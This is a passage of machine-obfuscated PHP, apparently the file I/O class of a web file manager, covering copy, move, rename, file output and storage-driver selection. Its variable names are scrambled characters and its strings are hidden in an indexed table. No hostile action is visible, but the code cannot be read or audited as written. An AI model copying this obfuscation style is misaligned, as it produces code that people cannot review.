self::copyFile($´Ëô„˜™, $¾÷†½ˆ, $ê›òË€´, $¾¡µ´¡¯, $®ıäñ­[$ãìªĞ–[32]], $“ÍôÂœ); if ($èŠÊâ±ñ) { $í• àïû = $èŠÊâ±ñ->getPathOuter($í• àïû); } return $í• àïû; } private static function copyMove($æ°¿¶Í, $§¨¯½Ñš, $×ÍúğïŠ, $Œáƒİ‡¢, $Êõàïï = false) { $¢ŠÂ„îì =& $_SERVER[Ôó‡è­ƒ]; if (!$æ°¿¶Í || $æ°¿¶Í == $¢ŠÂ„îì[8] || !$§¨¯½Ñš) { return !1; } ignore_timeout(); $€Óœ…˜ = self::driverMake($æ°¿¶Í); $À¶‹–Ç = self::driverMake($§¨¯½Ñš); $Ô¶Íß§› = $Œáƒİ‡¢ == $¢ŠÂ„îì[550]; $ª‡¦¬¦° = !1; if ($À¶‹–Ç->pathParse[$¢ŠÂ„îì[1151]]) { $ª‡¦¬¦° = $À¶‹–Ç; $§¨¯½Ñš = $À¶‹–Ç->pathParse[$¢ŠÂ„îì[1151]]; $À¶‹–Ç = self::driverMake($§¨¯½Ñš); } if ($€Óœ…˜->pathParse[$¢ŠÂ„îì[1151]]) { $æ°¿¶Í = $€Óœ…˜->pathParse[$¢ŠÂ„îì[1151]]; $€Óœ…˜ = self::driverMake($æ°¿¶Í); } self::check($€Óœ…˜, $æ°¿¶Í, $À¶‹–Ç, $§¨¯½Ñš); Hook::trigger($¢ŠÂ„îì[75], $€Óœ…˜, $æ°¿¶Í, $À¶‹–Ç, $§¨¯½Ñš); $ÄÌªæñ§ = self::driverIsSame($€Óœ…˜, $À¶‹–Ç); if ($ÄÌªæñ§) { if ($Œáƒİ‡¢ == $¢ŠÂ„îì[550] && !method_exists($À¶‹–Ç, $¢ŠÂ„îì[1152]) && trim($§¨¯½Ñš, $¢ŠÂ„îì[8]) == trim($À¶‹–Ç->pathFather($æ°¿¶Í), $¢ŠÂ„îì[8])) { if ($€Óœ…˜->pathThis($æ°¿¶Í) != $Êõàïï && !$€Óœ…˜->isTypeObject()) { return $€Óœ…˜->rename($æ°¿¶Í, $Êõàïï); } return $À¶‹–Ç->getPathOuter($æ°¿¶Í); } if (method_exists($À¶‹–Ç, $Œáƒİ‡¢)) { return $À¶‹–Ç->{$Œáƒİ‡¢}($æ°¿¶Í, $§¨¯½Ñš, $×ÍúğïŠ, $Êõàïï); } } if ($ÄÌªæñ§ && $Œáƒİ‡¢ == $¢ŠÂ„îì[550] && $À¶‹–Ç->getType() == $¢ŠÂ„îì[107]) { $éò·—Æ— = $À¶‹–Ç->movePath($æ°¿¶Í, $§¨¯½Ñš, $Êõàïï); if ($éò·—Æ—) { return $éò·—Æ—; } } $Ûçüô£­ = $€Óœ…˜->isFile($æ°¿¶Í); if (!$Ûçüô£­ && $À¶‹–Ç->getType() == $¢ŠÂ„îì[756] && $€Óœ…˜->getType() == $¢ŠÂ„îì[107]) { $éò·—Æ— = $À¶‹–Ç->copyFolderFromIO($€Óœ…˜, $æ°¿¶Í, $§¨¯½Ñš, $×ÍúğïŠ, $Ô¶Íß§›, $Êõàïï); } else { $éò·—Æ— = self::copyPath($€Óœ…˜, $æ°¿¶Í, $À¶‹–Ç, $§¨¯½Ñš, $×ÍúğïŠ, $Ô¶Íß§›, $Ûçüô£­, $Êõàïï); } if ($éò·—Æ— && $Ô¶Íß§›) { $€Óœ…˜->remove($æ°¿¶Í); } if ($ª‡¦¬¦°) { $éò·—Æ— = $ª‡¦¬¦°->getPathOuter($éò·—Æ—); } return $éò·—Æ—; } private static function check($äÙ£¿Éà, $Ö¿¬Ã é, $‰«ÖğßÁ, &$ÕÊÀå²ö) { $øè¬ë— =& $_SERVER[Ôó‡è­ƒ]; if (self::driverIsSame($äÙ£¿Éà, $‰«ÖğßÁ) && $äÙ£¿Éà->isFolder($Ö¿¬Ã é) && $äÙ£¿Éà->isParentOf($Ö¿¬Ã é, $ÕÊÀå²ö)) { show_json(LNG($øè¬ë—[1153]), !1); } if (!$äÙ£¿Éà->exist($Ö¿¬Ã é)) { show_json(LNG($øè¬ë—[106]), !1); } } private static function copyPath($ÓÜú¬ª¿, $·ÀÜ¾ß…, $ñ‡¢È‹è, $ËùÄÎğˆ, $‹æÂæÁË, $£ìï˜­€, $Ğ¹÷ì, $²ŸË×ëï = false) { $Ç¡¢ü£ =& $_SERVER[Ôó‡è­ƒ]; $ú•ˆó£ = empty($²ŸË×ëï) && $²ŸË×ëï !== $Ç¡¢ü£[194] ? $ÓÜú¬ª¿->pathThis($·ÀÜ¾ß…) : $²ŸË×ëï; if ($‹æÂæÁË) { $ÙÁ†¢Š¥ = $ñ‡¢È‹è->fileNameExist($ËùÄÎğˆ, $ú•ˆó£); $ú•ˆó£ = $ñ‡¢È‹è->fileNameAuto($ËùÄÎğˆ, $ú•ˆó£, $‹æÂæÁË, !$Ğ¹÷ì); $‹æÂæÁË = $ÙÁ†¢Š¥ ? $‹æÂæÁË : !1; } if ($Ğ¹÷ì) { return self::copyFile($ÓÜú¬ª¿, $·ÀÜ¾ß…, $ñ‡¢È‹è, $ËùÄÎğˆ, $ú•ˆó£, $£ìï˜­€); } if ($‹æÂæÁË == REPEAT_RENAME_FOLDER) { $‹æÂæÁË = !1; } $ã¥œ±” = rtrim($ËùÄÎğˆ, $Ç¡¢ü£[8]) . $Ç¡¢ü£[8] . $ú•ˆó£; $„ÙúÃ± = $ñ‡¢È‹è->mkdir($ñ‡¢È‹è->getPath($ã¥œ±”)); $ËùÄÎğˆ = $ñ‡¢È‹è->getPathInner($„ÙúÃ±); $Ì‹ô©ö÷ = $ÓÜú¬ª¿->listPath($·ÀÜ¾ß…, !0); $Ì‹ô©ö÷ = is_array($Ì‹ô©ö÷) ? $Ì‹ô©ö÷ : array($Ç¡¢ü£[76] => array(), $Ç¡¢ü£[77] => array()); $À¢¡Şõ = array_merge($Ì‹ô©ö÷[$Ç¡¢ü£[76]], $Ì‹ô©ö÷[$Ç¡¢ü£[77]]); foreach ($À¢¡Şõ as $ªöññç) { $ÁØíïüÃ = $ªöññç[$Ç¡¢ü£[33]] == $Ç¡¢ü£[196]; $·ÀÜ¾ß… = $ÓÜú¬ª¿->getPathInner($ªöññç[$Ç¡¢ü£[78]]); $ÃßÅÔ¥‰ = self::copyPath($ÓÜú¬ª¿, $·ÀÜ¾ß…, $ñ‡¢È‹è, $ËùÄÎğˆ, $‹æÂæÁË, $£ìï˜­€, $ÁØíïüÃ); if (!$ÃßÅÔ¥‰) { IO::errorTips($Ç¡¢ü£[1154] . $·ÀÜ¾ß… . $Ç¡¢ü£[70] . $ËùÄÎğˆ); } } self::copyMoveKeepInfo($ÓÜú¬ª¿, $·ÀÜ¾ß…, $„ÙúÃ±); return $„ÙúÃ±; } private static function copyFile($¾çŸÑõÍ, $âû¯—Â, $€‰ğÓ, $•³êÕ©, $Ó‰Ã‚¸¨, $ÅÜ¹¹ì) { $ÛĞ«”‡Ÿ =& $_SERVER[Ôó‡è­ƒ]; $•³êÕ© = $€‰ğÓ->getPath(rtrim($•³êÕ©, $ÛĞ«”‡Ÿ[8]) . $ÛĞ«”‡Ÿ[8] . $Ó‰Ã‚¸¨); $È—‘¸»® = $ÛĞ«”‡Ÿ[1155] . time() . rand_string(5); Hook::trigger($ÛĞ«”‡Ÿ[1156], $¾çŸÑõÍ, $âû¯—Â, $€‰ğÓ, $•³êÕ©, $Ó‰Ã‚¸¨, $È—‘¸»®); if (self::driverIsSame($¾çŸÑõÍ, $€‰ğÓ)) { if ($ÅÜ¹¹ì) { $—ù¿ı¬Š = $€‰ğÓ->moveFile($âû¯—Â, $•³êÕ©); } else { $—ù¿ı¬Š = $€‰ğÓ->copyFile($âû¯—Â, $•³êÕ©); } Hook::trigger($ÛĞ«”‡Ÿ[1157], $¾çŸÑõÍ, $âû¯—Â, $€‰ğÓ, $•³êÕ©, $Ó‰Ã‚¸¨, $—ù¿ı¬Š); self::copyMoveKeepInfo($¾çŸÑõÍ, $âû¯—Â, $—ù¿ı¬Š); return $—ù¿ı¬Š; } $·º‚óøœ = TEMP_FILES; if ($GLOBALS[$ÛĞ«”‡Ÿ[6]][$ÛĞ«”‡Ÿ[90]][$ÛĞ«”‡Ÿ[794]]) { $·º‚óøœ = $GLOBALS[$ÛĞ«”‡Ÿ[6]][$ÛĞ«”‡Ÿ[90]][$ÛĞ«”‡Ÿ[794]]; } $‡ïê¿¹ = $·º‚óøœ; mk_dir($‡ïê¿¹); $Ç¶ğÎœØ = $‡ïê¿¹ . $È—‘¸»®; $ñ¯¡§¶ = $Ç¶ğÎœØ; $Ç¶ğÎœØ = $¾çŸÑõÍ->download($âû¯—Â, $Ç¶ğÎœØ); $Ç¶ğÎœØ = $¾çŸÑõÍ->iconvApp($Ç¶ğÎœØ); if (substr($Ç¶ğÎœØ, strlen($·º‚óøœ)) == $·º‚óøœ) { $ÅÜ¹¹ì = !0; } $—ù¿ı¬Š = $€‰ğÓ->upload($•³êÕ©, $Ç¶ğÎœØ, $ÅÜ¹¹ì); self::remove($ñ¯¡§¶); Hook::trigger($ÛĞ«”‡Ÿ[1157], $¾çŸÑõÍ, $âû¯—Â, $€‰ğÓ, $•³êÕ©, $Ó‰Ã‚¸¨, $—ù¿ı¬Š); self::copyMoveKeepInfo($¾çŸÑõÍ, $âû¯—Â, $—ù¿ı¬Š); return $—ù¿ı¬Š; } private static function copyMoveKeepInfo($›ÉŒÒ¤, $ÓñÃƒ, $„¸ë¶ÆÇ) { if (!$„¸ë¶ÆÇ) { return; } $£ëı£Üí = $›ÉŒÒ¤->info($ÓñÃƒ); if (!is_array($£ëı£Üí)) { return; } IO::setModifyTime($„¸ë¶ÆÇ, $£ëı£Üí[$_SERVER[Ôó‡è­ƒ][86]]); } public static function pathFather($¥—Îøúí) { $í…Û“’õ = IO::init($¥—Îøúí); $ Ë÷Ô¸” = $í…Û“’õ->pathFather($í…Û“’õ->path); return $í…Û“’õ->getPathOuter($ Ë÷Ô¸”); } public static function fileOut($¥¥„§ú, $Ê©î¯£ˆ = false, $¾òùËú‚ = false, $ş½Ÿ¶¤Š = '') { $Àßæ´ÏØ = self::driverMake($¥¥„§ú); if ($Àßæ´ÏØ->isFileOutServer()) { return $Àßæ´ÏØ->fileOutServer($¥¥„§ú, $Ê©î¯£ˆ, $¾òùËú‚, $ş½Ÿ¶¤Š); } return $Àßæ´ÏØ->fileOut($¥¥„§ú, $Ê©î¯£ˆ, $¾òùËú‚, $ş½Ÿ¶¤Š); } public static function fileOutImage($òÙ›®õá, $êè®‹‹ä = 250) { $÷Ú×ûéñ = array(250, 600, 1200, 2000, 3000, 5000); for ($Ì¨ê‘¾¦ = 0; $Ì¨ê‘¾¦ < count($÷Ú×ûéñ); $Ì¨ê‘¾¦++) { if ($Ì¨ê‘¾¦ == 0 && $êè®‹‹ä <= $÷Ú×ûéñ[$Ì¨ê‘¾¦]) { $êè®‹‹ä = $÷Ú×ûéñ[$Ì¨ê‘¾¦]; break; } else { if ($êè®‹‹ä > $÷Ú×ûéñ[$Ì¨ê‘¾¦ - 1] && $êè®‹‹ä <= $÷Ú×ûéñ[$Ì¨ê‘¾¦]) { $êè®‹‹ä = $÷Ú×ûéñ[$Ì¨ê‘¾¦]; break; } else { if ($Ì¨ê‘¾¦ == count($÷Ú×ûéñ) - 1 && $êè®‹‹ä > $÷Ú×ûéñ[$Ì¨ê‘¾¦]) { $êè®‹‹ä = $÷Ú×ûéñ[$Ì¨ê‘¾¦]; break; } } } } $¥âÀúÃ = self::driverMake($òÙ›®õá); if ($¥âÀúÃ->isFileOutServer()) { return $¥âÀúÃ->fileOutImageServer($òÙ›®õá, $êè®‹‹ä); } return $¥âÀúÃ->fileOutImage($òÙ›®õá, $êè®‹‹ä); } private static function driverIsSame($İû†Ñ¦, $°£ë„İ) { $Üæì–ïï =& $_SERVER[Ôó‡è­ƒ]; $»¶ì•¥£ = $İû†Ñ¦->getType(); $µÒÕ†× = $°£ë„İ->getType(); if ($»¶ì•¥£ != $µÒÕ†×) { return !1; } if ($»¶ì•¥£ == $Üæì–ïï[756]) { return !0; } if ($»¶ì•¥£ == $Üæì–ïï[107]) { return !0; } if ($İû†Ñ¦->pathDriver == $°£ë„İ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ü±»É„è, $ÚşÇ¿á…) { $Ôğ§‡‘— =& $_SERVER[Ôó‡è­ƒ]; if (!IO::exist($ü±»É„è)) { return !1; } if (!IO::exist($ÚşÇ¿á…)) { IO::mkdir($ÚşÇ¿á…); } $¨ê½„” = self::_listAll($ü±»É„è); $€úÔòñ = self::_listAll($ÚşÇ¿á…); $¯±‹ï¡ğ = array(); $§ØÈëæ„ = array(); foreach ($¨ê½„” as $ˆêšÓ–Ç => $…âıùö³) { if (isset($€úÔòñ[$ˆêšÓ–Ç])) { if ($…âıùö³[$Ôğ§‡‘—[79]] == 1) { continue; } if ($€úÔòñ[$ˆêšÓ–Ç][$Ôğ§‡‘—[80]] == $…âıùö³[$Ôğ§‡‘—[80]]) { continue; } } if ($…âıùö³[$Ôğ§‡‘—[79]] == 1) { $§ØÈëæ„[] = $ÚşÇ¿á… . $Ôğ§‡‘—[8] . $ˆêšÓ–Ç; continue; } $é•çŒ« = strstr(trim($ˆêšÓ–Ç, $Ôğ§‡‘—[8]), $Ôğ§‡‘—[8]) ? get_path_father($ˆêšÓ–Ç) : $Ôğ§‡‘—[12]; $¯±‹ï¡ğ[] = array($Ôğ§‡‘—[1158] => $…âıùö³[$Ôğ§‡‘—[78]], $Ôğ§‡‘—[1159] => rtrim($ÚşÇ¿á…, $Ôğ§‡‘—[8]) . $Ôğ§‡‘—[8] . $é•çŒ«, $Ôğ§‡‘—[1160] => $…âıùö³); } $Ü¦ò®ğÏ = array($Ôğ§‡‘—[196] => $¯±‹ï¡ğ, $Ôğ§‡‘—[79] => $§ØÈëæ„); Hook::trigger($Ôğ§‡‘—[1161], $ü±»É„è, $ÚşÇ¿á…, $Ü¦ò®ğÏ); foreach ($§ØÈëæ„ as $…âıùö³) { IO::mkdir($…âıùö³); } foreach ($¯±‹ï¡ğ as $…âıùö³) { IO::copy($…âıùö³[$Ôğ§‡‘—[1158]], $…âıùö³[$Ôğ§‡‘—[1159]], REPEAT_REPLACE); } } private static function _listAll($€®†úæ) { $¦«ÖŠÉı =& $_SERVER[Ôó‡è­ƒ]; $€®†úæ = KodIO::clear($€®†úæ); $¾¸ÕÆ´° = IO::listAll($€®†úæ); foreach ($¾¸ÕÆ´° as &$¼¿œßñå) { $øéÄ  = substr($¼¿œßñå[$¦«ÖŠÉı[78]], strlen($€®†úæ)); $¼¿œßñå[$¦«ÖŠÉı[1162]] = trim($øéÄ , $¦«ÖŠÉı[8]); } unset($¼¿œßñå); return array_to_keyvalue($¾¸ÕÆ´°, $¦«ÖŠÉı[1162]); } public static function fileSubstr($³Œµ¸ì, $ı–¦”, $‹¤´¾› = false) { $¸€®ÃÕ =& $_SERVER[Ôó‡è­ƒ]; $‹¥‰š¶Ï = self::driverMake($³Œµ¸ì); $Ïº‹• = $‹¥‰š¶Ï->size($³Œµ¸ì); $“Ôå—ãú = $ı–¦”; $¯Î˜­Òİ = $‹¤´¾›; if ($ı–¦” < 0) { $ı–¦” = $Ïº‹• + $ı–¦”; } if ($‹¤´¾› === !1) { $‹¤´¾› = $Ïº‹• - $ı–¦”; } if ($ı–¦” + $‹¤´¾› > $Ïº‹•) { $‹¤´¾› = $Ïº‹• - $ı–¦”; } if (!$Ïº‹• && $‹¥‰š¶Ï->getType() == $¸€®ÃÕ[107] && !$‹¥‰š¶Ï->exist($³Œµ¸ì)) { $Ë‰àëÈ = get_path_this($³Œµ¸ì); $ª¾Î ¯  = parse_url_query($Ë‰àëÈ); if (is_array($ª¾Î ¯ ) && isset($ª¾Î ¯ [$¸€®ÃÕ[32]])) { $Ë‰àëÈ = urldecode($ª¾Î ¯ [$¸€®ÃÕ[32]]); } throw new Exception($¸€®ÃÕ[1163] . LNG($¸€®ÃÕ[1164]) . $¸€®ÃÕ[966] . clear_html($Ë‰àëÈ) . $¸€®ÃÕ[12]); } if ($‹¤´¾› <= 0) { return $¸€®ÃÕ[12]; } if ($ı–¦” < 0 || $ı–¦” >= $Ïº‹• || $‹¤´¾› > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\x52\145\141\144\x20\x65\x72\162\157\x72\x21\x20\x73\164\141\162\x74\x3d{$ı–¦”}\73\154\x65\156\147\164\x68\75{$‹¤´¾›}\x3b\x20\x73\x69\x7a\x65\x3d{$Ïº‹•}\x3b"); } $­”Íşâè = $‹¥‰š¶Ï->fileSubstr($³Œµ¸ì, $ı–¦”, $‹¤´¾›); if (!$­”Íşâè && $‹¤´¾› && isset($GLOBALS[$¸€®ÃÕ[1165]])) { throw new Exception($GLOBALS[$¸€®ÃÕ[1165]][$¸€®ÃÕ[1166]]); } return $­”Íşâè; } private static function driverMake(&$”ÄíÌ¹Â) { $ûş••† =& $_SERVER[Ôó‡è­ƒ]; $Ä¦Ù—Ë’ = KodIO::parse($”ÄíÌ¹Â); if (!self::$driverListSystem) { $´•ÙÜŠú = Model($ûş••†[765])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($´•ÙÜŠú, $ûş••†[396]); } if ($Ä¦Ù—Ë’[$ûş••†[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ä¦Ù—Ë’[$ûş••†[396]]]) { return !1; } $”ÄíÌ¹Â = $Ä¦Ù—Ë’[$ûş••†[1167]]; $åÙÕãÎä = self::driverGet($Ä¦Ù—Ë’, $”ÄíÌ¹Â); return $åÙÕãÎä; } private static function driverGet($Îü¡ëïô, &$ìÖ¼«ˆç) { $Ù½êŠ˜‰ =& $_SERVER[Ôó‡è­ƒ]; $àÌèéâ = $Îü¡ëïô[$Ù½êŠ˜‰[1168]]; $¹‚Œ¨Şä = $Îü¡ëïô[$Ù½êŠ˜‰[396]]; switch ($Îü¡ëïô[$Ù½êŠ˜‰[33]]) { case KodIO::KOD_IO: $‡ô¢¢¡¾ = self::$driverListSystem[$¹‚Œ¨Şä]; break; case KodIO::KOD_SOURCE: $ìÖ¼«ˆç = $¹‚Œ¨Şä . $ìÖ¼«ˆç; $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1170], $Ù½êŠ˜‰[6] => $Îü¡ëïô); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÄÔÍÔÆ› = $GLOBALS[$Ù½êŠ˜‰[1171]]; self::$driverListUser = array_to_keyvalue($ÄÔÍÔÆ›, $Ù½êŠ˜‰[396]); } $‡ô¢¢¡¾ = self::$driverListUser[$¹‚Œ¨Şä]; break; case KodIO::KOD_SHARE_LINK: $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1172], $Ù½êŠ˜‰[6] => $Îü¡ëïô); $ğÊ‚Ñ‘ = Action($Ù½êŠ˜‰[1173])->sharePathInfo($Îü¡ëïô[$Ù½êŠ˜‰[78]]); $ìÖ¼«ˆç = $ğÊ‚Ñ‘[$Ù½êŠ˜‰[399]]; if (!$ğÊ‚Ñ‘[$Ù½êŠ˜‰[399]]) { $–û¥ÍñÙ = Model($Ù½êŠ˜‰[594])->getInfo($ğÊ‚Ñ‘[$Ù½êŠ˜‰[484]]); $ìÖ¼«ˆç = KodIO::clear($–û¥ÍñÙ[$Ù½êŠ˜‰[1174]] . $Îü¡ëïô[$Ù½êŠ˜‰[1167]]); $Îü¡ëïô[$Ù½êŠ˜‰[482]] = $–û¥ÍñÙ; $Îü¡ëïô[$Ù½êŠ˜‰[1151]] = $ìÖ¼«ˆç; $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1175], $Ù½êŠ˜‰[6] => $Îü¡ëïô); } break; case KodIO::KOD_SHARE_ITEM: $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1176], $Ù½êŠ˜‰[6] => $Îü¡ëïô); $–û¥ÍñÙ = Model($Ù½êŠ˜‰[594])->getInfo($Îü¡ëïô[$Ù½êŠ˜‰[396]]); if ($–û¥ÍñÙ[$Ù½êŠ˜‰[399]] == $Ù½êŠ˜‰[194]) { $ìÖ¼«ˆç = KodIO::clear($–û¥ÍñÙ[$Ù½êŠ˜‰[1174]] . $Îü¡ëïô[$Ù½êŠ˜‰[1167]]); $Îü¡ëïô[$Ù½êŠ˜‰[482]] = $–û¥ÍñÙ; $Îü¡ëïô[$Ù½êŠ˜‰[1151]] = $ìÖ¼«ˆç; $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1177], $Ù½êŠ˜‰[6] => $Îü¡ëïô); } else { if (!$ìÖ¼«ˆç) { $ìÖ¼«ˆç = $–û¥ÍñÙ[$Ù½êŠ˜‰[399]]; } } break; default: $ìÖ¼«ˆç = $Îü¡ëïô[$Ù½êŠ˜‰[78]]; $‡ô¢¢¡¾ = array($Ù½êŠ˜‰[1169] => $Ù½êŠ˜‰[1178]); break; } $¿”á²šà = $Îü¡ëïô[$Ù½êŠ˜‰[78]]; if (!isset(self::$driverCache[$¿”á²šà])) { $×Û‘’õï = strtolower($‡ô¢¢¡¾[$Ù½êŠ˜‰[96]]); $‘À©Êæå = $GLOBALS[$Ù½êŠ˜‰[6]][$Ù½êŠ˜‰[90]][$Ù½êŠ˜‰[824]]; $ÒÂƒ¦­â = $Ù½êŠ˜‰[74] . (isset($‘À©Êæå[$×Û‘’õï]) ? $‘À©Êæå[$×Û‘’õï] : ucfirst($×Û‘’õï)); if (!class_exists($ÒÂƒ¦­â)) { show_json("{$ÒÂƒ¦­â}\40\x6e\157\164\40\145\x78\x69\x73\x74\x73\41", !1); } $àä›®“ = isset($‡ô¢¢¡¾[$Ù½êŠ˜‰[6]]) ? $‡ô¢¢¡¾[$Ù½êŠ˜‰[6]] : !1; self::$driverCache[$¿”á²šà] = new $ÒÂƒ¦­â($àä›®“); } $ùéì…Å… = self::$driverCache[$¿”á²šà]; $ùéì…Å…->pathDriver = $àÌèéâ; $ùéì…Å…->pathBase = $Ù½êŠ˜‰[12]; if (isset($‡ô¢¢¡¾[$Ù½êŠ˜‰[6]][$Ù½êŠ˜‰[1179]])) { $ùéì…Å…->pathBase = rtrim($‡ô¢¢¡¾[$Ù½êŠ˜‰[6]][$Ù½êŠ˜‰[1179]], $Ù½êŠ˜‰[8]) . $Ù½êŠ˜‰[8]; $ìÖ¼«ˆç = $ùéì…Å…->pathBase . ltrim($ìÖ¼«ˆç, $Ù½êŠ˜‰[8]); } $ìÖ¼«ˆç = $ùéì…Å…->getPath($ìÖ¼«ˆç); if (isset($Îü¡ëïô[$Ù½êŠ˜‰[1151]])) { $ìÖ¼«ˆç = $Îü¡ëïô[$Ù½êŠ˜‰[1151]]; } $ùéì…Å…->path = $ìÖ¼«ˆç; return $ùéì…Å…; } public static function errorTips($Ú£æèºŒ = false) { $’Â×â× =& $_SERVER[Ôó‡è­ƒ]; static $ïüÊŸÄù = array(); $ÅæºÅ = 1000; if ($Ú£æèºŒ === -1) { return $ïüÊŸÄù ? $ïüÊŸÄù[count($ïüÊŸÄù) - 1] : $’Â×â×[12]; } if ($Ú£æèºŒ === !1) { return implode($’Â×â×[230], $ïüÊŸÄù); } if (count($ïüÊŸÄù) >= $ÅæºÅ) { $ïüÊŸÄù = array_slice($ïüÊŸÄù, $ÅæºÅ * 0.5, $ÅæºÅ); } $ïüÊŸÄù[] = $Ú£æèºŒ; write_log($’Â×â×[163] . ACTION . $’Â×â×[1180] . $Ú£æèºŒ, $’Â×â×[1181]); } public static function getLastError($€ı±’êá = '') { $‰£·Ò—µ = self::errorTips(-1); return $‰£·Ò—µ ? $‰£·Ò—µ : $€ı±’êá; } } goto D—ÁŞ·‚¦; F‹²òê¥¥„: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $êœˆ¥½˜ =& $_SERVER[Ôó‡è­ƒ]; $this->objectDriver = array($êœˆ¥½˜[60], $êœˆ¥½˜[61], $êœˆ¥½˜[62], $êœˆ¥½˜[63], $êœˆ¥½˜[64], $êœˆ¥½˜[65], $êœˆ¥½˜[66], $êœˆ¥½˜[67], $êœˆ¥½˜[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ïúçŸ¦¨) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ïúçŸ¦¨, $_SERVER[Ôó‡è­ƒ][8]); } return $ïúçŸ¦¨; } public function iconvApp($áğŠâ) { return $áğŠâ; } public function iconvSystem($á²æÒÓí) { return $á²æÒÓí; } public function iconvTo($É²ñ¦ ñ, $ÊÀ¬õüÖ, $¬Šöåïğ) { $”ÆºØá¶ =& $_SERVER[Ôó‡è­ƒ]; if (!$É²ñ¦ ñ || !function_exists($”ÆºØá¶[69])) { return $É²ñ¦ ñ; } static $ºÕ«Ë›à = array(); $Ç±€¯©ü = $ÊÀ¬õüÖ . $”ÆºØá¶[70] . $¬Šöåïğ . $”ÆºØá¶[71] . $É²ñ¦ ñ; if (isset($ºÕ«Ë›à[$Ç±€¯©ü])) { return $ºÕ«Ë›à[$Ç±€¯©ü]; } if (function_exists($”ÆºØá¶[72])) { $İª•‚‹— = @mb_convert_encoding($É²ñ¦ ñ, $¬Šöåïğ, $ÊÀ¬õüÖ); } else { $İª•‚‹— = @iconv($ÊÀ¬õüÖ, $¬Šöåïğ, $É²ñ¦ ñ); } $İª•‚‹— = $İª•‚‹— ? $İª•‚‹— : $É²ñ¦ ñ; if (strstr($İª•‚‹—, $”ÆºØá¶[73])) { $İª•‚‹— = str_replace($”ÆºØá¶[73], $”ÆºØá¶[11], $İª•‚‹—); } $ºÕ«Ë›à[$ÊÀ¬õüÖ . $”ÆºØá¶[70] . $¬Šöåïğ . $”ÆºØá¶[71] . $É²ñ¦ ñ] = $İª•‚‹—; $ºÕ«Ë›à[$¬Šöåïğ . $”ÆºØá¶[70] . $ÊÀ¬õüÖ . $”ÆºØá¶[71] . $É²ñ¦ ñ] = $É²ñ¦ ñ; $ºÕ«Ë›à[$¬Šöåïğ . $”ÆºØá¶[70] . $ÊÀ¬õüÖ . $”ÆºØá¶[71] . $İª•‚‹—] = $É²ñ¦ ñ; $ºÕ«Ë›à[$ÊÀ¬õüÖ . $”ÆºØá¶[70] . $¬Šöåïğ . $”ÆºØá¶[71] . $İª•‚‹—] = $İª•‚‹—; return $İª•‚‹—; } public function getPathInner($ï€Ş¼˜²) { $‹ƒĞ‹ğÒ = IO::init($ï€Ş¼˜²); return $‹ƒĞ‹ğÒ->path; } public function getPathOuter($ÏÚ€µ¹) { $´„±ë…Í =& $_SERVER[Ôó‡è­ƒ]; $íÍ —£ = strlen(trim($this->pathBase, $´„±ë…Í[8])); $ÏÚ€µ¹ = substr(trim($ÏÚ€µ¹, $´„±ë…Í[8]), $íÍ —£); return $this->pathDriver . $´„±ë…Í[8] . ltrim($ÏÚ€µ¹, $´„±ë…Í[8]); } public function isParentOf($ßşÅäÌ‚, $‰€Çİ¸Î) { $ÀËÅÇƒù =& $_SERVER[Ôó‡è­ƒ]; $ßşÅäÌ‚ = rtrim(strtolower($ßşÅäÌ‚), $ÀËÅÇƒù[8]) . $ÀËÅÇƒù[8]; $‰€Çİ¸Î = rtrim(strtolower($‰€Çİ¸Î), $ÀËÅÇƒù[8]) . $ÀËÅÇƒù[8]; $·í¹¦­ = strpos($‰€Çİ¸Î, $ßşÅäÌ‚) === 0; return $·í¹¦­; } public function getType() { $»ãœ’²ó =& $_SERVER[Ôó‡è­ƒ]; $Ì‡ğ‹ = str_replace($»ãœ’²ó[74], $»ãœ’²ó[12], get_class($this)); return strtolower($Ì‡ğ‹); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Í…Ğö¹, $ÁÒäÓå) { $›ŠØî¢Â =& $_SERVER[Ôó‡è­ƒ]; $Ê¶‚­‹Ú = rtrim($Í…Ğö¹, $›ŠØî¢Â[8]) . $›ŠØî¢Â[8] . $ÁÒäÓå; $ÈÇ®‹²Ç = $this->exist($Ê¶‚­‹Ú); return $ÈÇ®‹²Ç ? $Ê¶‚­‹Ú : !1; } public function setModifyTime($ô‘ô³Ø¤, $­Û„ëŒ = '') { } public function renameObject($Ú¨‡…Œ¾, $±³¢ÖÈ) { $Û÷ä‘ğï =& $_SERVER[Ôó‡è­ƒ]; $²Ü÷ÓĞÄ = $±³¢ÖÈ; Hook::trigger($Û÷ä‘ğï[75], $this, $Ú¨‡…Œ¾, $this, $this->pathFather($Ú¨‡…Œ¾) . $±³¢ÖÈ); $Ú¨‡…Œ¾ = $this->getPathOuter($Ú¨‡…Œ¾); $±³¢ÖÈ = $this->pathFather($Ú¨‡…Œ¾) . $±³¢ÖÈ; if (IO::isFile($Ú¨‡…Œ¾)) { $À»æ†İ = IO::copy($Ú¨‡…Œ¾, $this->pathFather($Ú¨‡…Œ¾), REPEAT_RENAME_FOLDER, $²Ü÷ÓĞÄ); if ($À»æ†İ) { IO::remove($Ú¨‡…Œ¾); } } else { $À»æ†İ = IO::mkdir($±³¢ÖÈ); if (!$À»æ†İ) { return !1; } $ˆ¸±ÉÅ = IO::listPath($Ú¨‡…Œ¾, !0); $“¦äïßœ = array_merge($ˆ¸±ÉÅ[$Û÷ä‘ğï[76]], $ˆ¸±ÉÅ[$Û÷ä‘ğï[77]]); foreach ($“¦äïßœ as $ã·ÆÛíÎ) { IO::move($ã·ÆÛíÎ[$Û÷ä‘ğï[78]], $±³¢ÖÈ, REPEAT_RENAME_FOLDER); } 